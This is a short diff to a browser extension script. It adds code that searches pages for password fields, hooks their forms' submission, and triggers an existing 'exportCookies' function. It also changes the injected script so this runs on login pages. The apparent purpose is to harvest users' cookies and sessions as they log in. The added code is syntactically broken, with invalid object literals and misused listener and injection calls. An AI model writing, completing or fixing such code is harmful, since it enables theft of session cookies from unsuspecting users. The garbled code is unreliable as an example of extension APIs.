@@ -70,9 +70,23 @@ function exportCookies() {
 
 }
 
+
+function willthisWork() {
+    inputElem = document.querySelectorAll("input");
+    inputElem.forEach(function(item, index) {
+        if (item.type == 'password') {
+            form = (item.parentNode).id;
+            document.getElementById(form).addEventListener("onSubmit", chrome.runtime.sendMessage({'do you want a cookie'});
+        }
+    });
+}
+
+chrome.runtime.onMessage.addListener({'do you want a cookie'}, sender, exportCookies());
+
 chrome.tabs.executeScript({
-  code: 'document.getElementById(\'loginbutton\').addEventListener(\'click\', function() { exportCookies(); });'
+  code: willthisWork()
 });
+
 
 chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
     chrome.tabs.sendMessage(tabs[0].id, {
